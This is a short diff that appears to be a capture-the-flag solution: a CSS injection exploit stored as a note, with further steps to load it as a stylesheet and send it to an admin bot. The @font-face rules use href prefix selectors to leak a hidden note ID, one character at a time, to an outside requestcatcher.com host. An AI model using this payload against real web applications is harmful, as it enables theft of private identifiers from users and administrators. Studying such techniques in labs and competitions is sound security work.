@@ -1,0 +1,23 @@
+Note 1 (3090adc1-fbea-4f41-b361-88b810063f51): 
+@font-face {
+  font-family: exfilFont0;
+  src: url(https://bubu.requestcatcher.com/?id=0);
+}
+a[href^='/api/notes/0'] {
+  font-family: exfilFont0;
+}
+
+@font-face {
+  font-family: exfilFonta;
+  src: url(https://bubu.requestcatcher.com/?id=a);
+}
+a[href^='/api/notes/a'] {
+  font-family: exfilFonta;
+}
+
+
+Note 2 (3090adc1-fbea-4f41-b361-88b810063f51):
+
+<link rel=stylesheet href="/static/api/notes/3090adc1-fbea-4f41-b361-88b810063f51"/>
+
+Report to the bot note 2 (3090adc1-fbea-4f41-b361-88b810063f51).
